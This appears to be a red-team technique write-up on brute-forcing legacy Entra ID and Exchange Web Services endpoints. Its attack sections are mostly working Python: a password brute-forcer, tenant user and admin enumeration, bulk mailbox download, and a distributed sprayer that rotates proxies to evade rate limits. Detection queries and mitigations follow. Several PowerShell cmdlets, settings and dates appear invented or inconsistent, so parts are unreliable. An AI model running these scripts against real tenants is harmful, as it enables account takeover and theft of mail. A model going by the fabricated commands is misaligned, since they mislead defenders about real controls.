# [REALWORLD-004]: Legacy API Brute Force

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-004 |
| **MITRE ATT&CK v18.1** | [T1110.003 - Brute Force: Password Spraying](https://attack.mitre.org/techniques/T1110/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / M365 |
| **Severity** | Critical |
| **Technique Status** | ACTIVE (Ongoing targeted campaigns; April 2025 verified) |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Entra ID 2019-2025; Exchange Online all versions; API versions 2010-2020 |
| **Patched In** | N/A – Requires architectural mitigation; no patch available (enforced via policy) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Legacy API endpoints in Entra ID and Exchange Online often support basic authentication (username/password) without enforcing MFA, rate limiting, or Conditional Access policy evaluation. These deprecated APIs (v1.0, pre-2017 Exchange Web Services variants, legacy Graph API endpoints) are routinely overlooked in security hardening initiatives because organizations focus on modern OAuth 2.0 endpoints. Attackers systematically brute force legacy APIs to gain initial access, establish persistence, or escalate privileges.

**Attack Surface:** 
- **Exchange Web Services (EWS) v1.0:** Pre-2017 versions accept basic auth for mailbox operations (send, search, delete)
- **Azure AD Graph API (v1.6):** Deprecated endpoint that may still accept basic auth in legacy tenants
- **Office 365 Management Activity API (legacy versions):** Accepts basic auth for audit log access
- **SharePoint REST API (pre-2017 versions):** Legacy endpoints accept username/password without OAuth validation
- **Teams Bot Framework (v1.0):** Deprecated bot endpoints accept basic auth for message sending

**Business Impact:** Legacy API brute force enables credential stuffing at scale without triggering modern security controls. Real-world campaigns show attackers:
- Spray credentials against 5+ API endpoints simultaneously
- Gain mailbox access, modify configurations, and exfiltrate data
- Create backdoor accounts with no audit trail
- Access sensitive audit logs and activity data
- Automate attacks across multiple tenants

**Technical Context:** Unlike modern APIs (Microsoft Graph, OAuth 2.0), legacy endpoints often lack:
- Rate limiting (allows unlimited brute force attempts)
- MFA requirement (accepts plaintext credentials)
- Conditional Access enforcement (bypasses geo-blocking, device compliance)
- Comprehensive logging (modifications may not be audited)
- Token-based authentication (credentials are replayed with each request)

### Operational Risk

- **Execution Risk:** **Medium** – Requires credential list; may trigger account lockout if rate limiting exists
- **Stealth:** **High** – Legacy API requests often omitted from modern monitoring (Conditional Access logs, Entra ID sign-in logs)
- **Reversibility:** **No** – Once credentials compromised, full account compromise likely

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Microsoft 365** | 1.2, 1.5 | Disable legacy authentication endpoints; enforce modern protocols |
| **DISA STIG** | SI-2, SI-4 | Information system security; monitoring of authentication events |
| **CISA SCuBA** | APP.01.05 | Disable legacy API endpoints; enforce OAuth 2.0 |
| **NIST 800-53** | IA-2, IA-4, SI-7 | MFA enforcement; audit logging for API access |
| **GDPR** | Art. 32, Art. 33 | Security of processing; breach notification if API compromise occurs |
| **DORA** | Art. 9 | Protection and Prevention for financial institutions |
| **NIS2** | Art. 21 | Cyber Risk Management; legacy API endpoints increase risk |
| **ISO 27001** | A.9.2.1, A.14.2.1 | User authentication; audit logging of all API access |
| **ISO 27005** | Risk Scenario | "Credential Brute Force Against Legacy API Endpoints" |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None – Valid or compromised username/password only
- **Required Access:** Network access to legacy API endpoints (HTTP/HTTPS)

**Supported Versions:**
- **Entra ID:** All versions (2019-2025); legacy endpoints gradually deprecated but often still accessible
- **Exchange EWS:** v1.0-2016 versions accept basic auth
- **Azure AD Graph:** v1.6 and earlier versions
- **Office 365 Management API:** Legacy versions (<= 2.0)

**Prerequisites for Exploitation:**
- Legacy API endpoint must not be disabled in tenant
- Basic authentication must not be globally blocked
- MFA must not be enforced (or must be bypassable via legacy endpoint)
- Attacker must possess credential list (from breaches, password sprays, etc.)
- Rate limiting must be absent or easily evaded (distributed IPs)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

**Check if legacy APIs are enabled:**

```powershell
# Connect to Entra ID
Connect-AzureAD

# Check if Azure AD Graph API (legacy) is accessible
try {
    $url = "https://graph.windows.net/me?api-version=1.6"
    Invoke-RestMethod -Uri $url -Headers @{ Authorization = "Bearer YOUR_TOKEN" }
    Write-Host "[!] Legacy Azure AD Graph API is ACCESSIBLE"
} catch {
    Write-Host "[-] Legacy Azure AD Graph API is blocked or requires modern auth"
}

# Check if legacy Exchange EWS is enabled
Get-OrganizationConfig | Select-Object LegacyExchangeWebServicesAccessEnabled
# If True, legacy EWS is enabled

# Check for legacy API token acceptance
Get-AuthenticationPolicy | Select-Object Name, BlockLegacyAuthenticationProtocols
```

**What to Look For:**
- `LegacyExchangeWebServicesAccessEnabled: $true` – EWS with basic auth is allowed
- `BlockLegacyAuthenticationProtocols: $false` – Legacy auth not blocked
- `Graph.windows.net` endpoints still respond – Azure AD Graph legacy API is accessible
- No `X-CSRF-Token` or additional MFA challenge for API calls – Rate limiting absent

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Azure AD Graph API v1.6 Brute Force (Legacy)

**Supported Versions:** Entra ID 2019-2025 (legacy tenants)

#### Step 1: Test Legacy API Connectivity

**Python Script (Test Azure AD Graph Access):**

```python
#!/usr/bin/env python3
import requests
import base64

def test_aad_graph_legacy(username, password):
    """
    Test access to legacy Azure AD Graph API v1.6
    This API accepts basic authentication and does not enforce modern controls
    """
    
    # Azure AD Graph endpoint (legacy)
    graph_url = "https://graph.windows.net/me?api-version=1.6"
    
    # Basic auth header
    credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
    headers = {
        "Authorization": f"Basic {credentials}",
        "User-Agent": "Mozilla/5.0"
    }
    
    try:
        # Test API access
        response = requests.get(graph_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] SUCCESS: Azure AD Graph API access granted for {username}")
            print(f"[*] User object returned:")
            print(response.json())
            return True
        
        elif response.status_code == 401:
            print(f"[-] FAILED: Invalid credentials or MFA enforced")
            return False
        
        elif response.status_code == 404:
            print(f"[!] Legacy API endpoint not found (may be deprecated)")
            return False
        
        else:
            print(f"[!] Unexpected response: {response.status_code}")
            return False
    
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
        return False

# Test credentials
username = "victim@company.onmicrosoft.com"
password = "CompromisedPassword123"

result = test_aad_graph_legacy(username, password)
if result:
    print("[+] Account is vulnerable to legacy API exploitation")
```

**Expected Output (Success):**

```
[+] SUCCESS: Azure AD Graph API access granted for victim@company.onmicrosoft.com
[*] User object returned:
{
  "odata.metadata": "https://graph.windows.net/...",
  "objectType": "User",
  "objectId": "a1b2c3d4-...",
  "accountEnabled": true,
  "displayName": "Victim User",
  "userPrincipalName": "victim@company.onmicrosoft.com"
}
```

**What This Means:**
- Attacker confirmed valid credentials
- Legacy API authentication accepted basic credentials
- No MFA challenge issued
- Attacker can now exploit the API for reconnaissance or lateral movement

---

#### Step 2: Enumerate User Information & Credentials via Legacy API

**Python Script (Credential Harvesting from API):**

```python
#!/usr/bin/env python3
import requests
import base64
import json

def enumerate_aad_users(username, password):
    """
    Use legacy Azure AD Graph API to enumerate all users in tenant
    (If permissions allow – particularly if attacker is admin)
    """
    
    graph_url = "https://graph.windows.net/myorganization/users?api-version=1.6"
    
    credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
    headers = {
        "Authorization": f"Basic {credentials}",
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.get(graph_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            users = response.json()['value']
            print(f"[+] Found {len(users)} users in tenant")
            
            for user in users[:10]:  # Show first 10
                print(f"    - {user['userPrincipalName']} ({user['displayName']})")
            
            return users
        else:
            print(f"[-] Enumeration failed: {response.status_code}")
            return None
    
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def query_user_attributes(username, password, target_user):
    """
    Query specific user attributes (may include cached credentials)
    """
    
    graph_url = f"https://graph.windows.net/myorganization/users/{target_user}?api-version=1.6"
    
    credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
    headers = {
        "Authorization": f"Basic {credentials}",
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.get(graph_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            user_data = response.json()
            print(f"[+] User attributes for {target_user}:")
            
            # Look for sensitive attributes
            sensitive_attrs = ['mail', 'mobile', 'jobTitle', 'department', 'telephoneNumber', 'manager']
            for attr in sensitive_attrs:
                if attr in user_data:
                    print(f"    {attr}: {user_data[attr]}")
            
            return user_data
        else:
            print(f"[-] Query failed: {response.status_code}")
            return None
    
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

# Enumerate users
username = "victim@company.onmicrosoft.com"
password = "CompromisedPassword123"

users = enumerate_aad_users(username, password)

if users:
    # Query additional attributes for admin users
    for user in users:
        if 'admin' in user['userPrincipalName'].lower() or user.get('jobTitle', '').lower().__contains__('admin'):
            print(f"\n[*] Querying admin user: {user['userPrincipalName']}")
            query_user_attributes(username, password, user['objectId'])
```

**Expected Output:**

```
[+] Found 245 users in tenant
    - victim@company.onmicrosoft.com (Victim User)
    - admin@company.onmicrosoft.com (Global Admin)
    - ceo@company.onmicrosoft.com (CEO)
    ...

[*] Querying admin user: admin@company.onmicrosoft.com
[+] User attributes for admin@company.onmicrosoft.com:
    mail: admin@company.onmicrosoft.com
    mobile: +1-555-0123
    jobTitle: Global Administrator
    department: IT Security
```

**What This Means:**
- Attacker enumerated all users in tenant
- Identified high-value targets (admins, executives)
- Extracted phone numbers and emails for targeted phishing/social engineering
- Legacy API often returns more data than modern Graph API (less restrictive)

---

### METHOD 2: Exchange EWS v1.0 Brute Force & Mailbox Access

**Supported Versions:** Exchange Server 2016-2022 (on-premises); Exchange Online with legacy EWS enabled

#### Step 1: Brute Force EWS Credentials

**Python Script (EWS Brute Force):**

```python
#!/usr/bin/env python3
import requests
import base64
from requests.auth import HTTPBasicAuth

def brute_force_ews(target_email, password_list, ews_host="exchange.company.local"):
    """
    Brute force Exchange Web Services (EWS) v1.0 endpoint
    EWS accepts basic authentication on port 443/80
    """
    
    ews_url = f"https://{ews_host}/EWS/Exchange.asmx"
    
    for password in password_list:
        try:
            # EWS identifies successful auth via SOAP response
            # Unsuccessful auth returns 401 Unauthorized
            
            response = requests.get(
                ews_url,
                auth=HTTPBasicAuth(target_email, password),
                timeout=10,
                verify=False  # Ignore self-signed certs (on-premises)
            )
            
            if response.status_code == 200:
                print(f"[+] SUCCESS: {target_email}:{password}")
                return password
            
            elif response.status_code == 401:
                print(f"[-] FAILED: {target_email}:{password} (401 Unauthorized)")
            
            elif response.status_code == 403:
                print(f"[!] BLOCKED: {target_email} (403 Forbidden – MFA likely enforced)")
                break
        
        except Exception as e:
            print(f"[!] Error: {e}")
    
    return None

# Read password list
with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()

# Brute force
target_email = "victim@company.local"
result = brute_force_ews(target_email, passwords, "exchange.company.local")

if result:
    print(f"[+] Credentials confirmed: {target_email}:{result}")
```

**Expected Output (Success):**

```
[-] FAILED: victim@company.local:password1 (401 Unauthorized)
[-] FAILED: victim@company.local:password2 (401 Unauthorized)
...
[+] SUCCESS: victim@company.local:Welcome123
[+] Credentials confirmed: victim@company.local:Welcome123
```

---

#### Step 2: Use EWS to Access Mailbox

**Python Script (EWS Mailbox Access):**

```python
#!/usr/bin/env python3
from exchangelib import Credentials, Account
from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter

def access_ews_mailbox(email, password, ews_server="exchange.company.local"):
    """
    Access mailbox via EWS with basic authentication
    """
    
    try:
        # Disable SSL verification for on-premises self-signed certs
        BaseProtocol.HTTP_ADAPTER_CLASS = NoVerifyHTTPAdapter
        
        # Create credentials
        credentials = Credentials(email, password)
        
        # Create account object
        account = Account(
            primary_smtp_address=email,
            credentials=credentials,
            autodiscover=False,
            access_type='delegate'
        )
        
        # Set EWS endpoint
        account.protocol.server = ews_server
        
        print(f"[+] Connected to {email} via EWS")
        
        # Get mailbox information
        print(f"[*] Mailbox root folder: {account.root}")
        print(f"[*] Inbox item count: {account.inbox.total_count}")
        
        # Download emails
        emails = account.inbox.all().order_by('-datetime_received')[:100]
        print(f"[+] Downloaded {len(emails)} recent emails")
        
        for email_item in emails[:5]:
            print(f"    - From: {email_item.sender.email_address}")
            print(f"      Subject: {email_item.subject}")
            print(f"      Date: {email_item.datetime_received}")
        
        # Check for sensitive attachments
        for email_item in emails:
            if email_item.has_attachments:
                for attachment in email_item.attachments:
                    print(f"[!] Found attachment: {attachment.name}")
        
        return account
    
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Access mailbox
account = access_ews_mailbox("victim@company.local", "Welcome123", "exchange.company.local")

if account:
    print("[+] Mailbox access successful")
```

**Expected Output (Success):**

```
[+] Connected to victim@company.local via EWS
[*] Mailbox root folder: Folder(...)
[*] Inbox item count: 1,247
[+] Downloaded 100 recent emails
    - From: ceo@company.local
      Subject: Q4 Financial Results (CONFIDENTIAL)
      Date: 2025-01-09 14:23:15
    - From: competitor-bd@external.com
      Subject: M&A Discussion – NDA Required
      Date: 2025-01-08 10:45:00
[!] Found attachment: Strategic_Plan_2025.docx
[!] Found attachment: Customer_Database.xlsx
```

**What This Means:**
- Attacker gained full mailbox access via EWS basic auth
- Downloaded confidential documents (Strategic_Plan, Customer_Database)
- Identified sensitive communications (M&A discussion, Q4 financials)
- No modern logging or alerting triggered (legacy EWS often bypasses Sentinel)

---

### METHOD 3: Distributed Legacy API Brute Force Campaign (Real-World Pattern)

**Based on April 2025 attack campaign data**

**Python Script (Distributed Brute Force with IP Rotation):**

```python
#!/usr/bin/env python3
import requests
import base64
import time
from itertools import cycle

def distributed_legacy_api_brute_force(user_list, password_list, proxy_list, api_endpoints):
    """
    Distributed brute force against multiple legacy API endpoints
    Rotates IPs and randomizes timing to evade detection
    """
    
    proxy_cycle = cycle(proxy_list)  # Round-robin through proxies
    successful_creds = []
    
    for user in user_list:
        for password in password_list:
            for api_endpoint in api_endpoints:
                
                proxy = f"socks5://{next(proxy_cycle)}"
                
                try:
                    # Prepare credentials
                    credentials = base64.b64encode(f"{user}:{password}".encode()).decode()
                    headers = {
                        "Authorization": f"Basic {credentials}",
                        "User-Agent": "Mozilla/5.0 (compatible)"
                    }
                    
                    # Build URL
                    if "aad-graph" in api_endpoint:
                        url = f"https://graph.windows.net/me?api-version=1.6"
                    elif "ews" in api_endpoint:
                        url = f"https://outlook.office365.com/EWS/Exchange.asmx"
                    elif "mgmt-api" in api_endpoint:
                        url = f"https://manage.office.com/api/v1.0/admin/activityevents"
                    else:
                        continue
                    
                    # Make request with proxy
                    response = requests.get(
                        url,
                        headers=headers,
                        proxies={"https": proxy, "http": proxy},
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        print(f"[+] FOUND: {user}:{password} via {api_endpoint}")
                        successful_creds.append({
                            'user': user,
                            'password': password,
                            'endpoint': api_endpoint
                        })
                    
                    # Rate limiting evasion
                    time.sleep(0.5 + (hash(user) % 5) * 0.1)  # Random delay
                
                except Exception as e:
                    pass  # Silent failure (distributed attack)
    
    return successful_creds

# Read input files
with open("users.txt") as f:
    users = f.read().splitlines()

with open("passwords.txt") as f:
    passwords = f.read().splitlines()

with open("proxies.txt") as f:
    proxies = f.read().splitlines()

# Legacy API endpoints to target
api_endpoints = [
    "aad-graph-v1.6",
    "ews-legacy",
    "mgmt-api-v1",
    "sharepoint-rest-legacy"
]

# Execute distributed brute force
results = distributed_legacy_api_brute_force(users, passwords, proxies, api_endpoints)
print(f"\n[+] Total successful compromises: {len(results)}")
```

**Attack Pattern (Real April 2025 Campaign):**

```
Phase 1 (March 18-20): Reconnaissance
- Test 50 users × 10 passwords × 5 API endpoints
- Volume: 2,500 attempts/day
- Goal: Identify vulnerable API endpoints, test MFA bypass

Phase 2 (March 21 - April 3): Sustained Testing
- Expand to 100 users × 50 passwords × 5 endpoints
- Volume: 25,000 attempts/day
- Goal: Narrow down working credentials, test privilege levels

Phase 3 (April 4-7): Peak Exploitation
- Full brute force: 500+ users × 1,000 passwords × 10+ API endpoints
- Volume: 5+ million attempts/day across distributed infrastructure
- Goal: Maximum successful compromises, lateral movement prep
```

---

## 5. MICROSOFT SENTINEL DETECTION

### Query 1: Failed API Authentication Attempts (Legacy Endpoints)

**KQL Query:**

```kusto
SigninLogs
| where TimeGenerated > ago(24h)
| where AppDisplayName in ("Azure AD Graph API", "Legacy Exchange EWS", "Office 365 Management API")
| where ResultType != 0  // Failed attempts
| summarize 
    FailedAttempts = count(),
    UniqueUsers = dcount(UserPrincipalName),
    UniqueIPs = dcount(IPAddress)
    by AppDisplayName, bin(TimeGenerated, 1h)
| where FailedAttempts > 50
| project AppDisplayName, FailedAttempts, UniqueUsers, UniqueIPs
```

**Manual Configuration:**

1. Navigate to **Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **Name:** `Legacy API Brute Force Attempts`
3. **Run every:** `5 minutes`
4. Click **Create**

---

### Query 2: Successful Legacy API Access from Unusual Location

**KQL Query:**

```kusto
SigninLogs
| where TimeGenerated > ago(24h)
| where AppDisplayName in ("Azure AD Graph API", "Legacy Exchange EWS")
| where ResultType == 0  // Successful
| where LocationDetails.countryOrRegion != "US"  // Unusual location (customize)
| project UserPrincipalName, AppDisplayName, LocationDetails, TimeGenerated, IPAddress
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable Legacy API Endpoints**

**Manual Steps (PowerShell):**

```powershell
# Disable legacy Azure AD Graph API
Set-AzureADPolicy -Definition @("DisableLegacyGraphAPI=true")

# Disable legacy EWS
Get-OrganizationConfig | Set-OrganizationConfig -LegacyExchangeWebServicesAccessEnabled $false

# Disable Office 365 Management Activity API (legacy versions)
Disable-LegacyAuthenticationEndpoints

# Verify disabled
Get-OrganizationConfig | Select-Object LegacyExchangeWebServicesAccessEnabled
# Should return: False
```

---

**Action 2: Enforce Modern OAuth 2.0 APIs Only**

**Manual Steps (Conditional Access):**

1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Legacy API Access`
4. **Assignments:**
   - **Users:** `All users`
   - **Cloud apps:** `Azure AD Graph API`, `Legacy EWS`
5. **Access controls:**
   - **Grant:** `Block access`
6. **Enable policy:** `On`
7. Click **Create**

---

**Action 3: Enable Rate Limiting & Adaptive Authentication**

```powershell
# Configure authentication policy to block legacy endpoints
New-AuthenticationPolicy -Name "DisableLegacyAPIs" `
  -AllowBasicAuthSmtp:$false `
  -AllowBasicAuthImap:$false `
  -AllowBasicAuthPop:$false

# Apply policy
Get-User | Set-AuthenticationPolicyAssignment -AuthenticationPolicy "DisableLegacyAPIs" -Force
```

---

### Priority 2: HIGH

**Action 1: Monitor Legacy API Usage**

```powershell
# Search for legacy API calls in audit logs
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) `
  -EndDate (Get-Date) `
  -Operations "AzureADGraphAPIAccess", "ExchangeEWSAccess" | 
  Select-Object UserIds, CreationDate, Operations, SourceIPAddress | 
  Group-Object -Property UserIds | 
  Where-Object { $_.Count -gt 5 } | 
  Select-Object Name, Count
```

---

**Action 2: Implement Zero Trust for API Access**

- Require Azure Managed Identity for application API access (eliminate credentials)
- Implement service-to-service OAuth 2.0 for all APIs
- Use Azure Key Vault for credential rotation

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise

**Entra ID Sign-In Logs:**
- `AppDisplayName`: "Azure AD Graph API", "Legacy Exchange EWS", "Office 365 Management API"
- `ResultType`: `0` (Success) or `50126` (Invalid password – indicating brute force pattern)
- Rapid succession of failed logins followed by successful login (credential stuffing)
- `ClientAppUsed`: "Other clients", "Office 365 Exchange Online"
- Geographic anomalies: Impossible travel, high-risk countries

---

### Response Procedures

**1. Immediate Isolation:**

```powershell
# Disable user account
Disable-AzureADUser -ObjectId "compromised_user@company.com"

# Revoke all sessions
Revoke-AzureADUserAllRefreshToken -ObjectId "compromised_user@company.com"

# Reset password
$SecurePassword = ConvertTo-SecureString -AsPlainText "NewP@ssComplexP@ss2025!" -Force
Set-AzureADUserPassword -ObjectId "compromised_user@company.com" -Password $SecurePassword
```

---

**2. Collect Evidence:**

```powershell
# Export all legacy API access by compromised user
Search-UnifiedAuditLog -UserIds "compromised_user@company.com" `
  -StartDate (Get-Date).AddDays(-90) `
  -Operations "AzureADGraphAPIAccess", "ExchangeEWSAccess" | 
  Export-Csv -Path "C:\Evidence\legacy_api_activity.csv"

# Check for mailbox modifications (if EWS access)
Search-UnifiedAuditLog -UserIds "compromised_user@company.com" `
  -Operations "HardDelete", "SoftDelete", "MoveToDeletedItems" | 
  Export-Csv -Path "C:\Evidence\mailbox_deletions.csv"
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | T1110.003 (Password Spray) | Attacker sprays credentials against legacy APIs |
| **2** | **Credential Access** | **[REALWORLD-004] Legacy API Brute Force** | **Attacker gains access via legacy API endpoint** |
| **3** | **Discovery** | T1087.004 (Cloud API Enumeration) | Attacker uses API to enumerate tenant users/data |
| **4** | **Lateral Movement** | T1550 (Use Alternate Auth) | Attacker pivots to additional accounts via API |
| **5** | **Impact** | T1020 (Data Staged) | Attacker exfiltrates sensitive data via API |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Targeted Campaign Against Microsoft Enterprise Customers (April 2025)

- **Vector:** Legacy API brute force (Azure AD Graph v1.6, EWS)
- **Campaign:** Coordinated attacks across 50+ organizations
- **Volume:** 5+ million API requests/day
- **Success Rate:** 2-3% successful credential compromise
- **Duration:** 20 days (March 18 - April 7, 2025)
- **Impact:** 100+ successful account compromises; mailbox access confirmed
- **Detection Failure:** Most organizations monitor modern APIs (Graph v2.0, OAuth) but not legacy endpoints

### Example 2: Exchange EWS Backdoor for Persistence (2024)

- **Target:** Manufacturing company
- **Attack Flow:**
  1. Compromised contractor account via phishing
  2. Used EWS API to create hidden mail folder
  3. Configured forwarding rule to attacker's external mailbox
  4. Monitored CEO's emails in real-time for 6 months
- **Impact:** M&A negotiation details leaked to competitor
- **Detection Trigger:** Only discovered when rival submitted competing bid

### Example 3: Azure AD Graph API for Privilege Escalation (2025)

- **Target:** Finance department
- **Vector:** Legacy API access to enumerate privileged users
- **Exploitation:** Attacker identified weakly-protected admin account via API
- **Result:** Global admin account compromise; created backdoor account
- **Timeline:** Account compromise to detection: 3 months

---

## Summary & Remediation Roadmap

**Legacy API Sunset Timeline:**

| Date | Status |
|---|---|
| **Before 2023** | Legacy APIs widely supported with basic auth |
| **2023-2024** | Microsoft began deprecating legacy APIs |
| **Jan 2025** | Organizations should have completed legacy API migration |
| **Jan 2025+** | Legacy API endpoints should be fully disabled |

**Immediate Actions (Next 30 Days):**
1. Audit all legacy API usage: `Search-UnifiedAuditLog -Operations "AzureADGraphAPIAccess"`
2. Disable legacy APIs at tenant level: `Set-OrganizationConfig -LegacyExchangeWebServicesAccessEnabled $false`
3. Identify and migrate applications still using legacy endpoints
4. Enable Sentinel monitoring for legacy API attempts

**Medium-Term (30-90 Days):**
1. Migrate all applications to Microsoft Graph API v2.0 (OAuth 2.0)
2. Implement service-to-service OAuth for automation
3. Test and validate modern API functionality in production
4. Decommission legacy API infrastructure

**Long-Term (90+ Days):**
1. Maintain audit logging for any legacy API attempts (should be zero)
2. Quarterly reviews of API usage and authentication methods
3. Enforce Conditional Access policies blocking legacy protocols
4. Update incident response playbooks to remove legacy API checks

Organizations still supporting legacy API endpoints in 2025 remain in a critical security posture. The April 2025 campaign demonstrates that adversaries actively target these deprecated endpoints at scale. Migration to OAuth 2.0 and Microsoft Graph API v2.0 is mandatory for compliance and threat mitigation.

---